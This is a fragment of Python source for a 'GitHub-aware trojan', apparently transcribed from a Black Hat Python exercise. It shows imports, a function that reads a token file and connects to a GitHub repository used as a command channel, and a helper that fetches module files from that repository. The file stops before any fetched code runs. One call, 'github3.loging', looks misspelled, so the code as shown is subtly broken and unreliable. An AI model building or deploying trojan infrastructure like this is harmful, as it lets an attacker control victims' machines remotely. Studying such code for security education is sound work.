#!/usr/bin/env python
'''
Building a GitHub-Aware Trojan
BHP: page 121
'''

import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

def github_connect():
    with open ('mytoken.txt') as f:
        token = f.read()
    user = 'tiarno'
    sess = github3.loging(token=token)
    return sess.repository(user, 'bhptrojan')

def get_file_content(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content